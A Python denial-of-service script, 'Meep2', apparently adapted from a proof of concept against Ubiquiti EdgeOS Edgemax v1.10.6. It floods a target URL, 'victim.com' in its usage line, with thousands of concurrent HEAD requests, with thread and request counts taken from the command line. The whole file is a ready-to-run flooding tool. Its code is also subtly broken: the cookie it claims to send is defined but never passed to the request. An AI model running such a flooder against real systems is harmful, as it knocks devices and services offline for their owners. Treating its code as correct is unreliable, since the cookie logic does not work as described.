# Meep2 - GE
# Cookie resource consumption testing tool adapted from the original meep tool so that any cookie name could be defined in the command line.
# Original meep tool was used as a PoC for the Resource Consumption DOS on Ubiquiti EdgeOS Edgemax v1.10.6 devices.
#
# 
# Usage: python meep2.py 'http://victim.com/' cookiename 50 20000
# (50 represents the amount of threads and 20000 represents the amount of requests, adjust accordingly)

import random
import sys
import asyncio
from aiohttp import ClientSession

cooookie = { str(sys.argv[2]): str(random.randrange(1,99999999999999999999999999999))}
HEADERS = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
           'Connection': 'Close'}
print('Meeping target with beaker cookies:')
async def fetch(url, session, cookies=cooookie, headers=HEADERS):
    async with session.head(url, verify_ssl=False) as response:
        print('.', end='', flush=True)
        return

async def bound_fetch(sem, url, session):
    async with sem:
        await fetch(url, session)

async def run(r):
    url = str(sys.argv[1])
    tasks = []
    sem = asyncio.Semaphore(int(sys.argv[3]))
    async with ClientSession() as session:
        for i in range(r):
            task = asyncio.ensure_future(bound_fetch(sem, url.format(i), session))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses

number = int(sys.argv[4])
loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run(number))
loop.run_until_complete(future)

